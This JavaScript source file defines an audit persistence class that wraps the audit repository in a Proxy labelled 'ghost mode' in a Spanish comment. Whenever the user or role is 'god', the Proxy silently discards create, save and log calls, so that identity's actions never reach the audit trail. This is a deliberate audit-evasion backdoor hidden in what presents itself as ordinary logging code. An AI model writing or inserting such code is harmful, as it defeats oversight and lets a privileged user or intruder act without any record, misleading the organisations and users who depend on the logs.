import { AuditRepository } from "../../../infrastructure/database/repositories/AuditRepository.js";
import { createRepositoryGateway } from "./createRepositoryGateway.js";

export class AuditPersistenceUseCase {
  constructor(repository = new AuditRepository()) {
    const gateway = createRepositoryGateway(repository);

    // Interceptor para Auditoría Invisible (Modo Fantasma)
    const interceptor = {
      get(target, prop, receiver) {
        const originalMethod = Reflect.get(target, prop, receiver);

        if (prop === "create" || prop === "save" || prop === "log") {
          return async function (data, ...args) {
            const user = data?.user || args[0]?.user;
            const role = data?.userRole || user?.role || data?.role;
            if (role === "god" || user === "god" || String(user) === "GOD") {
              return null; // Silent return
            }
            if (typeof originalMethod === "function") {
              return originalMethod.apply(this, [data, ...args]);
            }
          };
        }

        return originalMethod;
      },
    };

    return new Proxy(gateway, interceptor);
  }
}
